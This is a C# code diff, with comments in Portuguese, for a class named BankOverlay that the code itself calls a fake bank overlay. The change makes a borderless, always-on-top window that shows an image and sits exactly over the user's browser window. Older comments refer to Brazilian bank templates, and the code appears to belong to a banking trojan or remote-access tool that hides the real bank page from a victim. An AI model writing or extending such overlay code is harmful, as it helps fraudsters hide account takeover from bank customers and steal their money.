@@ -8,12 +8,12 @@ using System.IO;
 namespace ClienteScreen
 {
     /// <summary>
-    /// Overlay de banco falso - Segue padrão BB_01/CEF_01 do sistema antigo
+    /// Overlay de banco falso - Posicionado sobre janela do navegador
     /// Carrega imagem BMP da pasta overlay/
     /// </summary>
     public class BankOverlay : Form
     {
-        // ========== P/Invoke para SetWindowPos (TopMost) ==========
+        // ========== P/Invoke ==========
         static readonly IntPtr HWND_TOPMOST = new IntPtr(-1);
         const UInt32 SWP_NOSIZE = 0x0001;
         const UInt32 SWP_NOMOVE = 0x0002;
@@ -23,12 +23,27 @@ namespace ClienteScreen
         [return: MarshalAs(UnmanagedType.Bool)]
         public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
 
+        [DllImport("user32.dll")]
+        [return: MarshalAs(UnmanagedType.Bool)]
+        private static extern bool GetWindowRect(IntPtr hWnd, out RECT lpRect);
+
+        [StructLayout(LayoutKind.Sequential)]
+        private struct RECT
+        {
+            public int Left;
+            public int Top;
+            public int Right;
+            public int Bottom;
+        }
+
         private PictureBox pictureBox;
         private string imagePath;
+        private IntPtr browserWindowHandle;
 
-        public BankOverlay(string imageFileName)
+        public BankOverlay(string imageFileName, IntPtr browserHandle)
         {
             imagePath = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "overlay", imageFileName);
+            browserWindowHandle = browserHandle;
             InitializeComponent();
         }
 
@@ -36,11 +51,23 @@ namespace ClienteScreen
         {
             this.SuspendLayout();
 
-            // ========== Configuração do Form (igual BB_01/CEF_01) ==========
+            // ========== Configuração do Form ==========
             this.FormBorderStyle = FormBorderStyle.None;  // Sem bordas
-            this.WindowState = FormWindowState.Maximized;  // Fullscreen
             this.TopMost = true;  // Sempre no topo
             this.BackColor = Color.Black;  // Fundo preto padrão
+            this.StartPosition = FormStartPosition.Manual;  // Posição manual
+
+            // Obter dimensões da janela do navegador
+            if (browserWindowHandle != IntPtr.Zero && GetWindowRect(browserWindowHandle, out RECT rect))
+            {
+                this.Location = new Point(rect.Left, rect.Top);
+                this.Size = new Size(rect.Right - rect.Left, rect.Bottom - rect.Top);
+            }
+            else
+            {
+                // Fallback: fullscreen se não conseguir obter janela
+                this.WindowState = FormWindowState.Maximized;
+            }
 
             // Criar padrão xadrez preto e branco no fundo
             this.Paint += BankOverlay_Paint;
